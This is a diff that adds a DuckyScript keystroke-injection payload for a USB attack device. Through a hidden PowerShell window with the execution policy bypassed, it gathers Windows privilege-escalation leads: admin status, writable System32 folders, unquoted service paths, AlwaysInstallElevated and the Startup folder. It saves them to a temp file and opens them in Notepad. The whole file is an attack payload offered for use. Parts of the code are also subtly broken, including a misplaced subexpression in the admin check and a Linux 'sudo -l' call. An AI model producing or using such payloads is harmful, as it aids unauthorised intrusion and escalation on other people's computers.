@@ -1,0 +1,8 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+STRING $checks = @(); $checks += "=== Privilege Escalation Checks ==="; $checks += "User: $env:USERNAME"; $checks += "Admin: $([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"; $checks += "`n=== Sudo Privileges ==="; $checks += (sudo -l 2>&1); $checks += "`n=== Writable System Folders ==="; $checks += (Get-ChildItem -Path "C:\Windows\System32" -Directory | Where-Object {(Get-Acl $_.FullName).Access | Where-Object {$_.FileSystemRights -match "FullControl" -and $_.IdentityReference -match $env:USERNAME}}).FullName; $checks += "`n=== Unquoted Service Paths ==="; $checks += (Get-CimInstance Win32_Service | Where-Object {$_.PathName -notlike '"*"' -and $_.PathName -like "* *"} | Select-Object Name, PathName); $checks += "`n=== AlwaysInstallElevated ==="; $checks += (Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue); $checks += "`n=== Startup Folder ==="; $checks += "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"; $checks -join "`n" | Out-File "$env:TEMP\privesc.txt" -Encoding ASCII; notepad "$env:TEMP\privesc.txt"
+ENTER
